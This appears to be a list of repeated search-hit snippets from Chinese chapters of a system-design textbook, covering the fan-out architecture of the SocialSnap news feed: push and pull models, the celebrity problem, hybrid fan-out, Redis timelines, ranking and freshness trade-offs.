  c21_b10.md: ...et 的通信——与现有无状态的（stateless）基于 HTTP 的 feed 和帖子系统并行运行。DM 系统与核心 feed 系统隔离（独立连接服务器、独立数据库集群），以满足 DMs 不得降低核心体验的约束。  当前架构长什么样？Social...
  c21_b10.md: ...oad balancer）** 处理所有入站流量 * **应用服务器**（无状态的，stateless，水平扩展）服务 feed、帖子、用户资料 * **连接服务器**（有状态的，stateful，管理 DMs 的 WebSocket 连接） *...
  c21_b16.md: ...（消息丢失是灾难性）。对在线状态，用户可容忍陈旧。  **Q2.** SocialSnap 的 DM 功能起初是与核心 feed 隔离的独立子系统。随着时间，产品团队提出需要集成的功能：“当有人发 DM 时在 feed 显示通知”、“允许用户直接把...
  c21_b16.md: ...的 DM 功能起初是与核心 feed 隔离的独立子系统。随着时间，产品团队提出需要集成的功能：“当有人发 DM 时在 feed 显示通知”、“允许用户直接把帖子分享到 DM 对话”。这些集成如何挑战隔离约束，你会如何管理耦合？  **讨论：**...
  c21_b16.md: ...到 DM 对话”。这些集成如何挑战隔离约束，你会如何管理耦合？  **讨论：** 集成功能在先前隔离的系统之间创建耦合。Feed 系统需要知道 DM 事件；DM 系统需要知道帖子。如果这种耦合直接发生（Feed Service 同步调用 DM Se...
  c21_b16.md: ...合。  正确模式是事件驱动集成（第 8 章）：每个系统向共享总线发布事件，不直接依赖其他系统。  对“收到 DM 时在 feed 显示通知”：DM 系统向 Kafka 发布 `{event: "dm_received", recipient: A,...
  c21_b16.md: ...recipient: A, sender: B, message_id: M}`。通知服务消费该事件，决定是在 A 的 feed 显示、发送推送通知还是发邮件。DM 系统不需要了解 feed；feed 也不需要了解 DM；它们通过事件总线通信。...
  c21_b16.md: ...e_id: M}`。通知服务消费该事件，决定是在 A 的 feed 显示、发送推送通知还是发邮件。DM 系统不需要了解 feed；feed 也不需要了解 DM；它们通过事件总线通信。...
  c21_b16.md: ...M}`。通知服务消费该事件，决定是在 A 的 feed 显示、发送推送通知还是发邮件。DM 系统不需要了解 feed；feed 也不需要了解 DM；它们通过事件总线通信。...
  c21_b16.md: ...（消息丢失是灾难性）。对在线状态，用户可容忍陈旧。  **Q2.** SocialSnap 的 DM 功能起初是与核心 feed 隔离的独立子系统。随着时间，产品团队提出需要集成的功能：“当有人发 DM 时在 feed 显示通知”、“允许用户直接把...
  c21_b16.md: ...的 DM 功能起初是与核心 feed 隔离的独立子系统。随着时间，产品团队提出需要集成的功能：“当有人发 DM 时在 feed 显示通知”、“允许用户直接把帖子分享到 DM 对话”。这些集成如何挑战隔离约束，你会如何管理耦合？  **讨论：**...
  c21_b16.md: ...到 DM 对话”。这些集成如何挑战隔离约束，你会如何管理耦合？  **讨论：** 集成功能在先前隔离的系统之间创建耦合。Feed 系统需要知道 DM 事件；DM 系统需要知道帖子。如果这种耦合直接发生（Feed Service 同步调用 DM Se...
  c21_b16.md: ...合。  正确模式是事件驱动集成（第 8 章）：每个系统向共享总线发布事件，不直接依赖其他系统。  对“收到 DM 时在 feed 显示通知”：DM 系统向 Kafka 发布 `{event: "dm_received", recipient: A,...
  c21_b16.md: ...recipient: A, sender: B, message_id: M}`。通知服务消费该事件，决定是在 A 的 feed 显示、发送推送通知还是发邮件。DM 系统不需要了解 feed；feed 也不需要了解 DM；它们通过事件总线通信。...
  c21_b16.md: ...e_id: M}`。通知服务消费该事件，决定是在 A 的 feed 显示、发送推送通知还是发邮件。DM 系统不需要了解 feed；feed 也不需要了解 DM；它们通过事件总线通信。...
  c21_b16.md: ...M}`。通知服务消费该事件，决定是在 A 的 feed 显示、发送推送通知还是发邮件。DM 系统不需要了解 feed；feed 也不需要了解 DM；它们通过事件总线通信。...
  c22_b01.md: ...：“第 22 章会完整探讨。” 这次推迟是故意的——扇出问题对社交平台如此核心、架构上如此丰富，值得单独一章。  新闻 Feed 是扇出问题的最极端形式。  设想一个拥有 1000 万（10 million）关注者的用户在社交平台发照片。该帖子必须...
  c22_b01.md: ...设想一个拥有 1000 万（10 million）关注者的用户在社交平台发照片。该帖子必须出现在 1000 万人的 feed 中。如果每个 feed 都是个性化帖子列表，这条帖子必须以某种方式被放入 1000 万个地方。它必须够快，让关注者在数...
  c22_b01.md: ...0 万（10 million）关注者的用户在社交平台发照片。该帖子必须出现在 1000 万人的 feed 中。如果每个 feed 都是个性化帖子列表，这条帖子必须以某种方式被放入 1000 万个地方。它必须够快，让关注者在数秒内看到。而且必须持续发...
  c22_b01.md: ...快，让关注者在数秒内看到。而且必须持续发生——有数千万关注者的用户很多，他们频繁发帖。  这不是边界情况。它是每个社交 feed 的核心操作。每个设计决策都围绕这个问题展开：当用户 U 创建帖子 P 时，如何以及何时让 P 出现在 U 的关注者的...
  c22_b01.md: ...的核心操作。每个设计决策都围绕这个问题展开：当用户 U 创建帖子 P 时，如何以及何时让 P 出现在 U 的关注者的 feed 中？   ### 侦探简报  **客户：** SocialSnap 正在构建完整新闻 feed（超越前面章节简单 fe...
  c22_b01.md: ...出现在 U 的关注者的 feed 中？   ### 侦探简报  **客户：** SocialSnap 正在构建完整新闻 feed（超越前面章节简单 feed）。Feed 必须显示被关注用户的帖子，按相关性排序，持续更新。  **线索（需求）：**...
  c22_b01.md: ...ed 中？   ### 侦探简报  **客户：** SocialSnap 正在构建完整新闻 feed（超越前面章节简单 feed）。Feed 必须显示被关注用户的帖子，按相关性排序，持续更新。  **线索（需求）：**  * Feed 显示观看者关...
  c22_b01.md: ...### 侦探简报  **客户：** SocialSnap 正在构建完整新闻 feed（超越前面章节简单 feed）。Feed 必须显示被关注用户的帖子，按相关性排序，持续更新。  **线索（需求）：**  * Feed 显示观看者关注的所有用户...
  c22_b01.md: ...前面章节简单 feed）。Feed 必须显示被关注用户的帖子，按相关性排序，持续更新。  **线索（需求）：**  * Feed 显示观看者关注的所有用户的帖子 * 帖子排序不仅按时间，还受互动信号影响 * 被关注用户的新帖子在发布后 60 秒内出...
  c22_b01.md: ...万（10,000）个账户 * 有些账户关注者极多（名人、品牌）——最多 1000 万（10 million）关注者 * Feed 请求 p99 必须在 200ms 内完成 * 用户可以“点赞”、“评论”、“分享”帖子；这些互动影响 feed 排序...
  c22_b01.md: ...者 * Feed 请求 p99 必须在 200ms 内完成 * 用户可以“点赞”、“评论”、“分享”帖子；这些互动影响 feed 排序  **约束（证据）：**  * 5000 万（50 million）日活用户；峰值 500 万（5 millio...
  c22_b01.md: ...**约束（证据）：**  * 5000 万（50 million）日活用户；峰值 500 万（5 million）并发 feed 观看者 * 每天 1000 万（10 million）条帖子创建 * 平均每用户关注 500 个账户 * 读写比：重读...
  c22_b01.md: ...）条帖子创建 * 平均每用户关注 500 个账户 * 读写比：重读——每个帖子创建平均触发每个关注者每天约 500 次 feed 读取 * Feed 新鲜度：99% 关注者在帖子发布 60 秒内看到 * 关注者分布：95% 用户关注者少于 1 万（...
  c22_b01.md: ...均每用户关注 500 个账户 * 读写比：重读——每个帖子创建平均触发每个关注者每天约 500 次 feed 读取 * Feed 新鲜度：99% 关注者在帖子发布 60 秒内看到 * 关注者分布：95% 用户关注者少于 1 万（10,000）；5%...
  c22_b01.md: ...关注者的用户之间差距巨大，什么扇出策略能同时高效服务两类人群？  * * *   ### 22.1 两种基本策略  向 feed 投递帖子有两种策略，代表一致性-计算权衡的两端。...
  c22_b01.md: ...：“第 22 章会完整探讨。” 这次推迟是故意的——扇出问题对社交平台如此核心、架构上如此丰富，值得单独一章。  新闻 Feed 是扇出问题的最极端形式。  设想一个拥有 1000 万（10 million）关注者的用户在社交平台发照片。该帖子必须...
  c22_b01.md: ...设想一个拥有 1000 万（10 million）关注者的用户在社交平台发照片。该帖子必须出现在 1000 万人的 feed 中。如果每个 feed 都是个性化帖子列表，这条帖子必须以某种方式被放入 1000 万个地方。它必须够快，让关注者在数...
  c22_b01.md: ...0 万（10 million）关注者的用户在社交平台发照片。该帖子必须出现在 1000 万人的 feed 中。如果每个 feed 都是个性化帖子列表，这条帖子必须以某种方式被放入 1000 万个地方。它必须够快，让关注者在数秒内看到。而且必须持续发...
  c22_b01.md: ...快，让关注者在数秒内看到。而且必须持续发生——有数千万关注者的用户很多，他们频繁发帖。  这不是边界情况。它是每个社交 feed 的核心操作。每个设计决策都围绕这个问题展开：当用户 U 创建帖子 P 时，如何以及何时让 P 出现在 U 的关注者的...
  c22_b01.md: ...的核心操作。每个设计决策都围绕这个问题展开：当用户 U 创建帖子 P 时，如何以及何时让 P 出现在 U 的关注者的 feed 中？   ### 侦探简报  **客户：** SocialSnap 正在构建完整新闻 feed（超越前面章节简单 fe...
  c22_b01.md: ...出现在 U 的关注者的 feed 中？   ### 侦探简报  **客户：** SocialSnap 正在构建完整新闻 feed（超越前面章节简单 feed）。Feed 必须显示被关注用户的帖子，按相关性排序，持续更新。  **线索（需求）：**...
  c22_b01.md: ...ed 中？   ### 侦探简报  **客户：** SocialSnap 正在构建完整新闻 feed（超越前面章节简单 feed）。Feed 必须显示被关注用户的帖子，按相关性排序，持续更新。  **线索（需求）：**  * Feed 显示观看者关...
  c22_b01.md: ...### 侦探简报  **客户：** SocialSnap 正在构建完整新闻 feed（超越前面章节简单 feed）。Feed 必须显示被关注用户的帖子，按相关性排序，持续更新。  **线索（需求）：**  * Feed 显示观看者关注的所有用户...
  c22_b01.md: ...前面章节简单 feed）。Feed 必须显示被关注用户的帖子，按相关性排序，持续更新。  **线索（需求）：**  * Feed 显示观看者关注的所有用户的帖子 * 帖子排序不仅按时间，还受互动信号影响 * 被关注用户的新帖子在发布后 60 秒内出...
  c22_b01.md: ...万（10,000）个账户 * 有些账户关注者极多（名人、品牌）——最多 1000 万（10 million）关注者 * Feed 请求 p99 必须在 200ms 内完成 * 用户可以“点赞”、“评论”、“分享”帖子；这些互动影响 feed 排序...
  c22_b01.md: ...者 * Feed 请求 p99 必须在 200ms 内完成 * 用户可以“点赞”、“评论”、“分享”帖子；这些互动影响 feed 排序  **约束（证据）：**  * 5000 万（50 million）日活用户；峰值 500 万（5 millio...
  c22_b01.md: ...**约束（证据）：**  * 5000 万（50 million）日活用户；峰值 500 万（5 million）并发 feed 观看者 * 每天 1000 万（10 million）条帖子创建 * 平均每用户关注 500 个账户 * 读写比：重读...
  c22_b01.md: ...）条帖子创建 * 平均每用户关注 500 个账户 * 读写比：重读——每个帖子创建平均触发每个关注者每天约 500 次 feed 读取 * Feed 新鲜度：99% 关注者在帖子发布 60 秒内看到 * 关注者分布：95% 用户关注者少于 1 万（...
  c22_b01.md: ...均每用户关注 500 个账户 * 读写比：重读——每个帖子创建平均触发每个关注者每天约 500 次 feed 读取 * Feed 新鲜度：99% 关注者在帖子发布 60 秒内看到 * 关注者分布：95% 用户关注者少于 1 万（10,000）；5%...
  c22_b01.md: ...关注者的用户之间差距巨大，什么扇出策略能同时高效服务两类人群？  * * *   ### 22.1 两种基本策略  向 feed 投递帖子有两种策略，代表一致性-计算权衡的两端。...
  c22_b02.md: ...N 个关注者 3. 系统把 P 插入每个关注者的 **timeline 缓存** —— 一个预计算的、用户专属的内存 feed  关注者 F 请求 feed 时：  1. 读取 F 的 timeline 缓存——feed 已计算好 2. 立即返回...
  c22_b02.md: ...P 插入每个关注者的 **timeline 缓存** —— 一个预计算的、用户专属的内存 feed  关注者 F 请求 feed 时：  1. 读取 F 的 timeline 缓存——feed 已计算好 2. 立即返回：O(1) 延迟，极快  这就...
  c22_b02.md: ...预计算的、用户专属的内存 feed  关注者 F 请求 feed 时：  1. 读取 F 的 timeline 缓存——feed 已计算好 2. 立即返回：O(1) 延迟，极快  这就是 **push 模型**：帖子在写入时被推入关注者的 feed...
  c22_b02.md: ...feed 已计算好 2. 立即返回：O(1) 延迟，极快  这就是 **push 模型**：帖子在写入时被推入关注者的 feed。每次写入“扇出”到 N 个位置。  **优点：** feed 读取极快——timeline 已预计算并在内存中。读取时...
  c22_b02.md: ...就是 **push 模型**：帖子在写入时被推入关注者的 feed。每次写入“扇出”到 N 个位置。  **优点：** feed 读取极快——timeline 已预计算并在内存中。读取时没有复杂查询。  **缺点：** 1000 万（10 mill...
  c22_b02.md: ...l 模型）  用户 U 创建帖子 P 时：  1. U 的帖子写入数据库——仅此而已。不发生扇出。  关注者 F 请求 feed 时：  1. 获取 F 关注的账户列表（比如 500 个账户） 2. 对每个被关注账户，获取其最近帖子 3. 合并所有...
  c22_b02.md: ...账户列表（比如 500 个账户） 2. 对每个被关注账户，获取其最近帖子 3. 合并所有帖子并排序 4. 返回排序后的 feed  这就是 **pull 模型**：feed 在读取时按需计算。  **优点：** 写入成本极小——发帖无论关注者多少都...
  c22_b02.md: ...个被关注账户，获取其最近帖子 3. 合并所有帖子并排序 4. 返回排序后的 feed  这就是 **pull 模型**：feed 在读取时按需计算。  **优点：** 写入成本极小——发帖无论关注者多少都很便宜。没有预计算数据变陈旧，因为 feed...
  c22_b02.md: ...feed 在读取时按需计算。  **优点：** 写入成本极小——发帖无论关注者多少都很便宜。没有预计算数据变陈旧，因为 feed 总是实时计算。  **缺点：** 读取延迟高。读取 500 个被关注账户的帖子需要 500 次数据库查询（或等价操作）...
  c22_b02.md: ...点：** 读取延迟高。读取 500 个被关注账户的帖子需要 500 次数据库查询（或等价操作）、合并和排序——都在用户 feed 请求的关键路径上。峰值 500 万（5 million）并发 feed 观看者时，这是每小时 25 亿（2.5 bil...
  c22_b02.md: ...据库查询（或等价操作）、合并和排序——都在用户 feed 请求的关键路径上。峰值 500 万（5 million）并发 feed 观看者时，这是每小时 25 亿（2.5 billion）次数据库查询。即使对 per-user 帖子列表做激进缓存，读...
  c22_b03.md: ...### 22.2 名人问题  拥有 1000 万（10 million）关注者的用户在 feed 设计中被称为 **celebrity**（无论是否出名；该术语指架构现象）。名人问题是：如何在写时扇出不会压垮写路径、...
  c22_b03.md: ...每天 1000 万条——名人扇出产生的写入是帖子创建的 50 倍。  对名人用读时扇出：1000 万关注者中任何人请求 feed 时，读时扇出查询必须包含获取该名人的最近帖子。由于名人频繁发帖，这些帖子几乎总出现在 feed 顶部。但所有 500...
  c22_b03.md: ...万关注者中任何人请求 feed 时，读时扇出查询必须包含获取该名人的最近帖子。由于名人频繁发帖，这些帖子几乎总出现在 feed 顶部。但所有 500 万并发 feed 观看者都必须单独获取名人帖子，乘以关注的名人数量——即使缓存也是 5-10 倍...
  c22_b03.md: ...时扇出查询必须包含获取该名人的最近帖子。由于名人频繁发帖，这些帖子几乎总出现在 feed 顶部。但所有 500 万并发 feed 观看者都必须单独获取名人帖子，乘以关注的名人数量——即使缓存也是 5-10 倍读放大。  两种纯策略对名人都不可行。混...
  c22_b03.md: ...fan-out）** 对普通用户用写时扇出（关注者 < 阈值，例如 100 万），对名人用读时扇出（关注者 ≥ 阈值）。feed 由两个来源组装：  1. **预计算 timeline**（被关注的普通用户的写时扇出结果） 2. **按需获取的名人...
  c22_b03.md: ...ine**（被关注的普通用户的写时扇出结果） 2. **按需获取的名人帖子**（读取时从名人最近帖子列表获取）  最终 feed = merge(预计算_timeline, 我关注的 celebrity_posts)  plain 语言：不是对所有...
  c22_b04.md: ...制重要。工程实现良好的系统可根据观察到的写入成本动态调整阈值。   ### 22.3 Timeline 存储——预计算 Feed 存在哪里  对写时扇出路径，每个用户有一个 **timeline** —— 预计算的、属于其 feed 的帖子 ID...
  c22_b04.md: ...存储——预计算 Feed 存在哪里  对写时扇出路径，每个用户有一个 **timeline** —— 预计算的、属于其 feed 的帖子 ID 列表。   #### Timeline 里存什么？  Timeline 应存最少数据：仅帖子 ID（每个...
  c22_b04.md: ...存什么？  Timeline 应存最少数据：仅帖子 ID（每个 8 字节）和排序分数（每个 4 字节）。完整帖子内容在 feed 渲染时从帖子数据库或缓存获取。这种分离有两个好处：  1. **Timeline 内存效率：** 存帖子 ID 而非帖...
  c22_b04.md: ...:timeline` 是一个 sorted set，每个 member 是 `post_id`，score 是排序分数。Feed 获取即 `ZREVRANGEBYSCORE user:F:timeline +inf -inf LIMIT 0 20`...
  c22_b04.md: ...条，可覆盖 1 位关注者 1000 天历史——远超需要。实践中 1000 条对大多数用例足够。   ### 22.4 Feed 排序——把按时间列表变成按相关性排序的 Feed  早期 SocialSnap（第 1–11 章）按反向时间顺序显示...
  c22_b04.md: ...超需要。实践中 1000 条对大多数用例足够。   ### 22.4 Feed 排序——把按时间列表变成按相关性排序的 Feed  早期 SocialSnap（第 1–11 章）按反向时间顺序显示 feed。第 18 章金丝雀部署引入了排序算法——...
  c22_b04.md: ...排序——把按时间列表变成按相关性排序的 Feed  早期 SocialSnap（第 1–11 章）按反向时间顺序显示 feed。第 18 章金丝雀部署引入了排序算法——SocialSnap 对 5% 用户测试的新 feed 算法。现在我们设计该算...
  c22_b04.md: ...章）按反向时间顺序显示 feed。第 18 章金丝雀部署引入了排序算法——SocialSnap 对 5% 用户测试的新 feed 算法。现在我们设计该算法。...
  c22_b04.md: ...制重要。工程实现良好的系统可根据观察到的写入成本动态调整阈值。   ### 22.3 Timeline 存储——预计算 Feed 存在哪里  对写时扇出路径，每个用户有一个 **timeline** —— 预计算的、属于其 feed 的帖子 ID...
  c22_b04.md: ...存储——预计算 Feed 存在哪里  对写时扇出路径，每个用户有一个 **timeline** —— 预计算的、属于其 feed 的帖子 ID 列表。   #### Timeline 里存什么？  Timeline 应存最少数据：仅帖子 ID（每个...
  c22_b04.md: ...存什么？  Timeline 应存最少数据：仅帖子 ID（每个 8 字节）和排序分数（每个 4 字节）。完整帖子内容在 feed 渲染时从帖子数据库或缓存获取。这种分离有两个好处：  1. **Timeline 内存效率：** 存帖子 ID 而非帖...
  c22_b04.md: ...:timeline` 是一个 sorted set，每个 member 是 `post_id`，score 是排序分数。Feed 获取即 `ZREVRANGEBYSCORE user:F:timeline +inf -inf LIMIT 0 20`...
  c22_b04.md: ...条，可覆盖 1 位关注者 1000 天历史——远超需要。实践中 1000 条对大多数用例足够。   ### 22.4 Feed 排序——把按时间列表变成按相关性排序的 Feed  早期 SocialSnap（第 1–11 章）按反向时间顺序显示...
  c22_b04.md: ...超需要。实践中 1000 条对大多数用例足够。   ### 22.4 Feed 排序——把按时间列表变成按相关性排序的 Feed  早期 SocialSnap（第 1–11 章）按反向时间顺序显示 feed。第 18 章金丝雀部署引入了排序算法——...
  c22_b04.md: ...排序——把按时间列表变成按相关性排序的 Feed  早期 SocialSnap（第 1–11 章）按反向时间顺序显示 feed。第 18 章金丝雀部署引入了排序算法——SocialSnap 对 5% 用户测试的新 feed 算法。现在我们设计该算...
  c22_b04.md: ...章）按反向时间顺序显示 feed。第 18 章金丝雀部署引入了排序算法——SocialSnap 对 5% 用户测试的新 feed 算法。现在我们设计该算法。...
  c22_b05.md: ...#### 为什么排序重要  关注 500 个账户的用户每天会看到数千条帖子。如果按时间顺序显示，feed 会被高产账号主导（每天发很多次的账号），而发帖少的账号会沉到底部。用户若关注每天发 200 次的日报和每周发一次的好友...
  c22_b05.md: ...`affinity_weight` 能改善互动指标（第 18 章金丝雀部署方法论），就保留该权重。这是机器学习应用于 feed 排序——超出本书深度，但值得注意排序算法使用第 18 章的金丝雀部署框架持续演进。...
  c22_b06.md: ...# 排序分数何时计算？  这是关键架构决策：在写入时（帖子加入 timeline 时）计算分数，还是在读取时（用户请求 feed 时）？  **写时计分** 在帖子扇出时计算初始分数。实现简单，但分数可能陈旧：帖子加入 timeline 后若走红，...
  c22_b06.md: ...于 F 与 U 的历史，这意味着写时按用户计分需要为每个关注者读取 F 的亲密度画像。  **读时计分** 在用户请求 feed 时重新计算分数。给出最新分数。代价：每次请求可能对 timeline 中 1000+ 候选帖子做计分。500 万并发...
  c22_b06.md: ...时重新计算分数。给出最新分数。代价：每次请求可能对 timeline 中 1000+ 候选帖子做计分。500 万并发 feed 观看者时，每天 50 亿次计分——昂贵，但如果排序模型保持简单、用高效向量运算，仍可实现。  **实用混合：** 写时...
  c22_b06.md: ...个打分。   ### 22.5 完整扇出架构  现在我们有足够构件描述完整扇出架构。让我们追踪帖子从创建到出现在关注者 feed 中的生命周期。   #### 帖子创建流程  1. **用户 U 创建帖子 P：** U 的客户端向 API gate...
  c22_b07.md: ...#### Feed 读取流程  1. **用户 F 请求 feed：** `GET /feed` 到 Feed Service。 2. *...
  c22_b07.md: ...#### Feed 读取流程  1. **用户 F 请求 feed：** `GET /feed` 到 Feed Service。 2. **获取预计算 timeline：** `ZREV...
  c22_b07.md: ...#### Feed 读取流程  1. **用户 F 请求 feed：** `GET /feed` 到 Feed Service。 2. **获取预计算 timeline：** `ZREVRANGEBYSCORE u...
  c22_b07.md: ...#### Feed 读取流程  1. **用户 F 请求 feed：** `GET /feed` 到 Feed Service。 2. **获取预计算 timeline：** `ZREVRANGEBYSCORE user:F:ti...
  c22_b07.md: ...ted` 事件——与第 8 章为 SocialSnap 通知队列引入的基于 Kafka 的异步解耦模式相同，现在应用于 feed 投递规模。它是扇出架构的心脏：  * **水平可扩展：** 多个 Fanout Service worker 并行消费...
  c22_b07.md: ...#### Feed 读取流程  1. **用户 F 请求 feed：** `GET /feed` 到 Feed Service。 2. *...
  c22_b07.md: ...#### Feed 读取流程  1. **用户 F 请求 feed：** `GET /feed` 到 Feed Service。 2. **获取预计算 timeline：** `ZREV...
  c22_b07.md: ...#### Feed 读取流程  1. **用户 F 请求 feed：** `GET /feed` 到 Feed Service。 2. **获取预计算 timeline：** `ZREVRANGEBYSCORE u...
  c22_b07.md: ...#### Feed 读取流程  1. **用户 F 请求 feed：** `GET /feed` 到 Feed Service。 2. **获取预计算 timeline：** `ZREVRANGEBYSCORE user:F:ti...
  c22_b07.md: ...ted` 事件——与第 8 章为 SocialSnap 通知队列引入的基于 Kafka 的异步解耦模式相同，现在应用于 feed 投递规模。它是扇出架构的心脏：  * **水平可扩展：** 多个 Fanout Service worker 并行消费...
  c22_b08.md: ...幂律分布让混合策略可行。如果关注者均匀分布（每个用户关注者数相同），就没有可分割的有用阈值。   ### 22.7 Feed 陈旧与新鲜度 SLO  新鲜度 SLO 是“99% 关注者在 60 秒内看到新帖”。但另外 1% 呢？什么导致 fee...
  c22_b08.md: ...eed 陈旧与新鲜度 SLO  新鲜度 SLO 是“99% 关注者在 60 秒内看到新帖”。但另外 1% 呢？什么导致 feed 更新延迟？  **正常扇出延迟：** 对 50 万（500,000）关注者用户，扇出在并行下需要数秒。60 秒 SLO...
  c22_b08.md: ...nout Service 必须按突发容量扩展，而非仅稳态。  **名人帖子：** 名人帖子（读时扇出）在用户发帖后加载 feed 的瞬间就出现在 feed 中。用户在名人发帖 5 分钟后加载 feed 会看到它——但如果用户在名人发帖 1 分钟前加...
  c22_b08.md: ...必须按突发容量扩展，而非仅稳态。  **名人帖子：** 名人帖子（读时扇出）在用户发帖后加载 feed 的瞬间就出现在 feed 中。用户在名人发帖 5 分钟后加载 feed 会看到它——但如果用户在名人发帖 1 分钟前加载了 feed，则要等刷新...
  c22_b08.md: ...子：** 名人帖子（读时扇出）在用户发帖后加载 feed 的瞬间就出现在 feed 中。用户在名人发帖 5 分钟后加载 feed 会看到它——但如果用户在名人发帖 1 分钟前加载了 feed，则要等刷新才能看到。这是预计算 timeline 固有的...
  c22_b08.md: ...间就出现在 feed 中。用户在名人发帖 5 分钟后加载 feed 会看到它——但如果用户在名人发帖 1 分钟前加载了 feed，则要等刷新才能看到。这是预计算 timeline 固有的新鲜度限制。  **客户端刷新：** 客户端即使用户未主动互动...
  c22_b08.md: ...到。这是预计算 timeline 固有的新鲜度限制。  **客户端刷新：** 客户端即使用户未主动互动，也会周期性刷新 feed（“下拉刷新”或每 60 秒自动后台刷新）。这确保名人帖子和扇出延迟的帖子在一个刷新周期内出现。  新鲜度 SLO 同时...
  c22_b08.md: ...幂律分布让混合策略可行。如果关注者均匀分布（每个用户关注者数相同），就没有可分割的有用阈值。   ### 22.7 Feed 陈旧与新鲜度 SLO  新鲜度 SLO 是“99% 关注者在 60 秒内看到新帖”。但另外 1% 呢？什么导致 fee...
  c22_b08.md: ...eed 陈旧与新鲜度 SLO  新鲜度 SLO 是“99% 关注者在 60 秒内看到新帖”。但另外 1% 呢？什么导致 feed 更新延迟？  **正常扇出延迟：** 对 50 万（500,000）关注者用户，扇出在并行下需要数秒。60 秒 SLO...
  c22_b08.md: ...nout Service 必须按突发容量扩展，而非仅稳态。  **名人帖子：** 名人帖子（读时扇出）在用户发帖后加载 feed 的瞬间就出现在 feed 中。用户在名人发帖 5 分钟后加载 feed 会看到它——但如果用户在名人发帖 1 分钟前加...
  c22_b08.md: ...必须按突发容量扩展，而非仅稳态。  **名人帖子：** 名人帖子（读时扇出）在用户发帖后加载 feed 的瞬间就出现在 feed 中。用户在名人发帖 5 分钟后加载 feed 会看到它——但如果用户在名人发帖 1 分钟前加载了 feed，则要等刷新...
  c22_b08.md: ...子：** 名人帖子（读时扇出）在用户发帖后加载 feed 的瞬间就出现在 feed 中。用户在名人发帖 5 分钟后加载 feed 会看到它——但如果用户在名人发帖 1 分钟前加载了 feed，则要等刷新才能看到。这是预计算 timeline 固有的...
  c22_b08.md: ...间就出现在 feed 中。用户在名人发帖 5 分钟后加载 feed 会看到它——但如果用户在名人发帖 1 分钟前加载了 feed，则要等刷新才能看到。这是预计算 timeline 固有的新鲜度限制。  **客户端刷新：** 客户端即使用户未主动互动...
  c22_b08.md: ...到。这是预计算 timeline 固有的新鲜度限制。  **客户端刷新：** 客户端即使用户未主动互动，也会周期性刷新 feed（“下拉刷新”或每 60 秒自动后台刷新）。这确保名人帖子和扇出延迟的帖子在一个刷新周期内出现。  新鲜度 SLO 同时...
  c22_b09.md: ...### 22.8 个性化与 Feed 质量  我们设计的排序算法和 feed 组装架构按生产 feed 系统的标准来看很简单。主要社交平台的新闻 feed...
  c22_b09.md: ...### 22.8 个性化与 Feed 质量  我们设计的排序算法和 feed 组装架构按生产 feed 系统的标准来看很简单。主要社交平台的新闻 feed 要复杂得多：  **多模型排序：** 不...
  c22_b09.md: ...### 22.8 个性化与 Feed 质量  我们设计的排序算法和 feed 组装架构按生产 feed 系统的标准来看很简单。主要社交平台的新闻 feed 要复杂得多：  **多模型排序：** 不是单一打分函数，而是多个模...
  c22_b09.md: ...Feed 质量  我们设计的排序算法和 feed 组装架构按生产 feed 系统的标准来看很简单。主要社交平台的新闻 feed 要复杂得多：  **多模型排序：** 不是单一打分函数，而是多个模型顺序运行。粗排模型快速从数百万可能帖子中选出 10...
  c22_b09.md: ...个候选。更精细的精排模型对前 100 个重新排序。“不良内容”分类器删除违反政策的候选。  **用户互动反馈循环：** feed 也是训练数据来源。用户与帖子互动（或忽略）时，这些信号作为训练样本反馈到排序模型。模型基于真实用户行为持续改进——与第...
  c22_b09.md: ...多样性：** 纯相关性排序会重复显示同类内容——如果你昨天与猫照片互动，今天就看 mostly 猫照片。多样性约束确保 feed 包含多样内容：不同主题、不同关注账号、不同内容格式。  **赞助内容插入：** 广告以最大化互动又不损害用户体验的位置...
  c22_b09.md: ...多样内容：不同主题、不同关注账号、不同内容格式。  **赞助内容插入：** 广告以最大化互动又不损害用户体验的位置插入 feed。位置和广告由单独拍卖系统决定（本章之外）。   ### 22.9 新闻 Feed 权衡矩阵  新闻 feed 设计产生...
  c22_b09.md: ...最大化互动又不损害用户体验的位置插入 feed。位置和广告由单独拍卖系统决定（本章之外）。   ### 22.9 新闻 Feed 权衡矩阵  新闻 feed 设计产生第 V 部分案例研究中最复杂的权衡矩阵，反映扇出问题所需的架构选择：  设计决策...
  c22_b09.md: ...位置插入 feed。位置和广告由单独拍卖系统决定（本章之外）。   ### 22.9 新闻 Feed 权衡矩阵  新闻 feed 设计产生第 V 部分案例研究中最复杂的权衡矩阵，反映扇出问题所需的架构选择：  设计决策 | 写入成本 | 读取延迟...
  c22_b09.md: ...计产生第 V 部分案例研究中最复杂的权衡矩阵，反映扇出问题所需的架构选择：  设计决策 | 写入成本 | 读取延迟 | Feed 新鲜度 | 运营复杂度 ---|---|---|---|--- 全用户写时扇出 | 极高（每帖 N 次写入） | 极低...
  c22_b09.md: ...理） 100 万关注者名人阈值 | 名人零扇出 | 小开销（名人获取） | 名人帖子高 | 中（阈值管理）  关键观察：feed 投递的每种方法都是写入成本与读取延迟权衡曲线上的一个点。混合策略在任一轴上都不是最优——它比纯读时扇出写入成本高，比纯...
  c22_b09.md: ...### 22.8 个性化与 Feed 质量  我们设计的排序算法和 feed 组装架构按生产 feed 系统的标准来看很简单。主要社交平台的新闻 feed...
  c22_b09.md: ...### 22.8 个性化与 Feed 质量  我们设计的排序算法和 feed 组装架构按生产 feed 系统的标准来看很简单。主要社交平台的新闻 feed 要复杂得多：  **多模型排序：** 不...
  c22_b09.md: ...### 22.8 个性化与 Feed 质量  我们设计的排序算法和 feed 组装架构按生产 feed 系统的标准来看很简单。主要社交平台的新闻 feed 要复杂得多：  **多模型排序：** 不是单一打分函数，而是多个模...
  c22_b09.md: ...Feed 质量  我们设计的排序算法和 feed 组装架构按生产 feed 系统的标准来看很简单。主要社交平台的新闻 feed 要复杂得多：  **多模型排序：** 不是单一打分函数，而是多个模型顺序运行。粗排模型快速从数百万可能帖子中选出 10...
  c22_b09.md: ...个候选。更精细的精排模型对前 100 个重新排序。“不良内容”分类器删除违反政策的候选。  **用户互动反馈循环：** feed 也是训练数据来源。用户与帖子互动（或忽略）时，这些信号作为训练样本反馈到排序模型。模型基于真实用户行为持续改进——与第...
  c22_b09.md: ...多样性：** 纯相关性排序会重复显示同类内容——如果你昨天与猫照片互动，今天就看 mostly 猫照片。多样性约束确保 feed 包含多样内容：不同主题、不同关注账号、不同内容格式。  **赞助内容插入：** 广告以最大化互动又不损害用户体验的位置...
